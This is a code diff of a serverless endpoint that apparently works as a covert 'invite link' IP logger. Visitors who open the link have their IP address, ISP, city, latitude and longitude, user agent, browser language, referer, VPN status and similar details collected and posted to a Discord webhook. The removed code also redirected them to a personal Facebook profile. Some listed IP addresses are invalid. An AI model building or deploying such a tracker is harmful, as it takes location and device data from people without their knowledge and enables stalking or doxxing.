@@ -25,41 +25,7 @@ async function getIpDetails(ip) {
 }
 
 export default async function handler(req, res) {
-    if (req.method === 'POST') {
-        try {
-            const deviceInfo = await req.json();
-            const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-
-            // Get IP details, including approximate coordinates
-            const ipDetails = await getIpDetails(ip);
-
-            const message = {
-                username: "Device Info Logger",
-                embeds: [
-                    {
-                        title: "Device Information",
-                        color: 0x00FFFF,
-                        description: "Device info collected from user clicking the invite link.",
-                        fields: [
-                            ...(Object.keys(deviceInfo).map(key => ({
-                                name: key,
-                                value: `\`${deviceInfo[key]}\``,
-                                inline: true,
-                            }))),
-                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
-                            { name: "Latitude", value: `\`${ipDetails.lat || "Not available"}\``, inline: true },
-                            { name: "Longitude", value: `\`${ipDetails.lon || "Not available"}\``, inline: true },
-                        ]
-                    }
-                ]
-            };
-
-            await sendToWebhook(message);
-            res.status(200).json({ message: "Device info logged." });
-        } catch (error) {
-            res.status(500).json({ message: "Failed to process request." });
-        }
-    } else if (req.method === 'GET') {
+    if (req.method === 'GET' || req.method === 'POST') {
         const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
         const blacklistedIPs = ["716.147.210.120", "181.55.23.312"];
 
@@ -74,34 +40,50 @@ export default async function handler(req, res) {
             return;
         }
 
+        // Gather additional information from request headers
         const userAgent = req.headers['user-agent'] || 'Unknown';
+        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
+        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
+        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
+        const referer = req.headers['referer'] || 'No referer';
 
+        // Inferred network type based on IP geolocation data (basic inference)
+        const inferredNetworkType = ipDetails.mobile ? 'Mobile' : 'Broadband';
+
+        // Prepare the message to send to Discord webhook
         const message = {
-            username: "IP Logger",
+            username: "Extended Device Info Logger",
             embeds: [
                 {
-                    title: "Invite Link - IP Logged",
+                    title: "Extended Device and Network Information",
                     color: 0x00FFFF,
-                    description: `**A User Clicked The Invite Link!**\n\n**Endpoint:** \`/api/invite\`\n\n**IP Info:**`,
+                    description: "Device info collected from a server request.",
                     fields: [
-                        { name: "IP", value: `\`${ipDetails.query}\``, inline: true },
-                        { name: "Provider", value: `\`${ipDetails.isp}\``, inline: true },
-                        { name: "Country", value: `\`${ipDetails.country}\``, inline: true },
-                        { name: "Region", value: `\`${ipDetails.regionName}\``, inline: true },
-                        { name: "City", value: `\`${ipDetails.city}\``, inline: true },
-                        { name: "Timezone", value: `\`${ipDetails.timezone}\``, inline: true },
-                        { name: "Latitude", value: `\`${ipDetails.lat}\``, inline: true },
-                        { name: "Longitude", value: `\`${ipDetails.lon}\``, inline: true },
-                        { name: "Device Info", value: `\`${userAgent}\``, inline: false }
-                    ],
-                },
-            ],
+                        { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                        { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
+                        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
+                        { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                        { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
+                        { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
+                        { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
+                        { name: "Latitude", value: `\`${ipDetails.lat || "Unknown"}\``, inline: true },
+                        { name: "Longitude", value: `\`${ipDetails.lon || "Unknown"}\``, inline: true },
+                        { name: "Device Info", value: `\`${userAgent}\``, inline: false },
+                        { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
+                        { name: "Network Type", value: `\`${inferredNetworkType}\``, inline: true },
+                        { name: "Is Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
+                        { name: "Is Hosting Provider", value: `\`${ipDetails.hosting ? "Yes" : "No"}\``, inline: true },
+                        { name: "Accept Encoding", value: `\`${acceptEncoding}\``, inline: true },
+                        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
+                        { name: "Referer", value: `\`${referer}\``, inline: false }
+                    ]
+                }
+            ]
         };
-        
+
         await sendToWebhook(message);
-        
-        res.writeHead(302, { Location: 'https://www.facebook.com/janethalejandra.gonzalez.7?mibextid=LQQJ4d' });
-        res.end();
+        res.status(200).json({ message: "Device info logged." });
     } else {
         res.status(405).send("Method Not Allowed");
     }
